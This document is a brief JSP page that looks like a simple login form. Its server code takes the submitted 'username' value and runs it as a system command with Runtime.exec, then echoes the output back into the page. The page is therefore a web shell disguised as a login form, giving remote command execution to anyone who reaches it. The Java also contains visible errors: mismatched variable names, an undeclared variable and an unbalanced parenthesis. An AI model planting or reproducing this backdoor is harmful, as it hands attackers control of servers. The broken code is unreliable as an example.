<FORM METHOD=GET ACTION="index.jsp">
  <INPUT name="username" type=text>
  <INPUT type=submit value="Login">
</FORM>
<%@ page import="java.io.*" %>
<%
    String username = request.getParameter("username");
    String output = "";
    if(username != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(username, null, null);
            BufferedReader read = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((line = reader.readLine() != null) {
                output += line + "</br>";
            }
        } catch(IOException ex) {
            output = ex.getMessage();
        }
    }
%>
<pre><%= output %></pre>
